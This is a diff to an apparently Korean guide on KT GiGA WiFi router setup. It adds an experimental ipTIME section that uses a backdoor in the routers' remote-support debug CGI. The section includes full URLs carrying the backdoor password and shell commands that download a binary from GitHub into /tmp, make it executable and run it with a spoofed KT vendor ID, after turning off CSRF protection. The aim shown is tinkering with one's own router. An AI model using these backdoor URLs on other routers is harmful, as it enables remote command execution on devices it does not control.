@@ -16,6 +16,8 @@ KT GiGA WiFi 2025년 5월 1일 시점에서 지원
 
 ASUSWRT/OpenWrt/넷기어/시놀로지RT/기업용 브랜드 지원
 
+iptime(테스트중) 일부 지원
+
 iptime/netis/티피링크/머큐시스/D-Link/링크시스/기타 듣보잡 미지원\:
 미지원 기기에 적용하려면 지원 기기로부터 인터넷 연결을 제공받는 **각 기기** 중 하나여야 하며, **이중 NAT 구성**이므로 지원 기기에서 팁 적용 후 미지원 공유기가 제공하는 인터넷 연결이 영향을 받습니다.
 
@@ -125,6 +127,27 @@ __변경 사항은 다음에 유선 또는 무선으로 연결될 때 적용되�
 OpenWrt - 
 
 https://archive.md/VRZIO
+
+--------------------------------
+
+iptime(테스트중)
+
+백도어 출처 - https://github.com/tylzars/iptime-debug
+
+위 출처와 같이 iptime 공유기의 '원격 지원'기능에 잠재된 백도어에 접근할 방법이 있는 경우에만 유효합니다
+
+2번 과정에서 iptime에 내장된 wget이 HTTPS 연결을 지원하지 않는 경우, <a href="https://github.com/veilRedeemer/udhcp/releases">미리 빌드된 udhcpc</a>의 바이너리를 /tmp에 복사할 방법은 각자 준비하세요.
+또한, 필요한 바이너리는 사용중인 모델별로 다릅니다
+
+1. 적용하려는 기기는 '악성 스크립트 접근 방지(CSRF)'기능이 꺼져 있으며, '원격 지원'기능이 켜져 있어야 합니다. 또한 모델별로 다운로드받아야 할 udhcpc 파일명이 다를 수 있습니다
+2. http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fdhclient.gz%20https%3a%2f%2fgithub.com%2fveilRedeemer%2fudhcp%2freleases%2fdownload%2f0.9.9-pre%2fudhcpc_aarch64.gz
+3. http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=gzip%20-d%20%2ftmp%2fdhclient.gz
+4. http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=chmod%20755%20%2ftmp%2fdhclient
+5. 인터넷 설정 정보에서 '연결해제'를 선택합니다
+6. http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=%2ftmp%2fdhclient%20-s%20%2fsbin%2fdhcpc.sh%20-i%20eth1%20-p%20%2fvar%2frun%2fdhclient.eth1%20-V%20KT_PR_HH_A_A
+7. 새로운 '외부 IP 주소'를 확인해봅시다
+
+<a href="https://shop.kt.com/shrt/CCiqOp.do">따라하는 과정에서 발생하는 어려움은 대부분 여기에서 해결할 수 있습니다</a>
 
 --------------------------------
 
